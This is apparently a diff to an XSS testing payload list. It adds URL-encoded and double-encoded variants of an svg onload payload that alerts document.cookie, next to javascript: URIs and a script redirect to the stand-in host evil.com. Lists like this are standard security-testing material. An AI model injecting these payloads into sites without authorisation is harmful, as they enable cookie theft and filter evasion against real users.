@@ -5,6 +5,8 @@ javascript:alert(1)
 javascript://%0aalert(document.cookie)
 <svg only=1 onload=alert(document.cookie)>
 %3Csvg+only%3D1+onload%3Dalert%28document.+Cookie%29%3E
+%3Csvg%20only%3D1%20onload%3Dalert%28document.%20Cookie%29%3E
+%253Csvg%2520only%253D1%2520onload%253Dalert%2528document.%2520Cookie%2529%253E
 %253Csvg%2Bonly%253D1%2Bonload%253Dalert%2528document.%2BCookie%2529%253E
 <A HREF="http://evil.com/">Login Here </A>
 <script>document.location.href="http://evil.com"</script>
